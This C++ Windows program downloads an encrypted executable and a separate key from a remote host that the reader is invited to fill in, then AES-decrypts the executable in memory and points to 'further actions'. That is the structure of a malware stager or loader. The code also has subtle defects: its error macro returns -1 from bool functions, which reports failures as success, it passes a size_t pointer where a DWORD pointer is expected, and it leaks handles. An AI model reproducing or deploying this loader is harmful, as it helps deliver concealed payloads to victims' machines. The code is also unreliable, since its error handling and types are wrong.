#include <windows.h>
#include <stdio.h>
#include <vector>
#include <winhttp.h>
#include <wincrypt.h>

// Constants for error checking and configuration
#define CHECK_ERROR(cond, msg) \
    if (!(cond)) {             \
        printf("%s\n", msg);   \
        return -1;              \
    }

#define HOST L"example.com"   // Replace with your host
#define PORT 80              // Replace with your port
#define PE_RESOURCE L"/path/to/encrypted_pe"  // Replace with your resource path
#define KEY_RESOURCE L"/path/to/key"           // Replace with your key path

// Function to download data from a URL
bool DownloadData(const wchar_t* host, DWORD port, const wchar_t* resource, std::vector<BYTE>& data) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Initialize WinHTTP session
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    CHECK_ERROR(hSession != NULL, "Failed to open WinHTTP session");

    // Connect to the server
    hConnect = WinHttpConnect(hSession, host, port, 0);
    CHECK_ERROR(hConnect != NULL, "Failed to connect to the server");

    // Create an HTTP request handle
    hRequest = WinHttpOpenRequest(hConnect, L"GET", resource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    CHECK_ERROR(hRequest != NULL, "Failed to create HTTP request");

    // Send the request
    CHECK_ERROR(WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0),
                "Failed to send HTTP request");

    // Receive the response
    CHECK_ERROR(WinHttpReceiveResponse(hRequest, NULL), "Failed to receive HTTP response");

    // Read and store the data
    DWORD bytesRead = 0;
    BYTE buffer[1024];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }

    // Cleanup and return
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}

// Function to decrypt data using AES
bool DecryptAES(const BYTE* encryptedData, size_t dataSize, const BYTE* key, size_t keySize, std::vector<BYTE>& decryptedData) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    // Acquire a cryptographic provider context
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return false;
    }

    // Create a hash object
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        CryptReleaseContext(hProv, 0);
        return false;
    }

    // Hash the encryption key
    if (!CryptHashData(hHash, key, keySize, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    // Derive an AES encryption key from the hash
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    // Decrypt the data
    decryptedData.resize(dataSize);
    memcpy(decryptedData.data(), encryptedData, dataSize);
    if (!CryptDecrypt(hKey, NULL, 0, 0, decryptedData.data(), &dataSize)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    // Cleanup
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

int main() {
    std::vector<BYTE> encryptedPE;
    std::vector<BYTE> keyData;

    // Download the encrypted PE
    if (!DownloadData(HOST, PORT, PE_RESOURCE, encryptedPE)) {
        return -1;
    }

    // Download the decryption key
    if (!DownloadData(HOST, PORT, KEY_RESOURCE, keyData)) {
        return -1;
    }

    // Decrypt the PE
    std::vector<BYTE> decryptedPE;
    if (!DecryptAES(encryptedPE.data(), encryptedPE.size(), keyData.data(), keyData.size(), decryptedPE)) {
        return -1;
    }

    // At this point, 'decryptedPE' contains the decrypted PE data
    // You can proceed with any further actions you need to take

    printf("Decryption and downloading completed successfully.\n");

    return 0;
}
